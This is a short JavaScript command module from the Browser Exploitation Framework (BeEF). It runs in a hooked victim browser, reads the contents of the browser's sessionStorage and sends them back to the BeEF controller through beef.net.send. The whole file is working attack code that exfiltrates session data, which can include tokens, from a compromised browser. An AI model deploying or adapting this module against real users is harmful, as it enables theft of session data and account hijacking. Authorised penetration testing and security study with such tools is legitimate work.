//
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	if ('sessionStorage' in window && window['sessionStorage'] !== null) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify(window['sessionStorage']));
	} else beef.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify("HTML5 sessionStorage is null or not supported."));
});
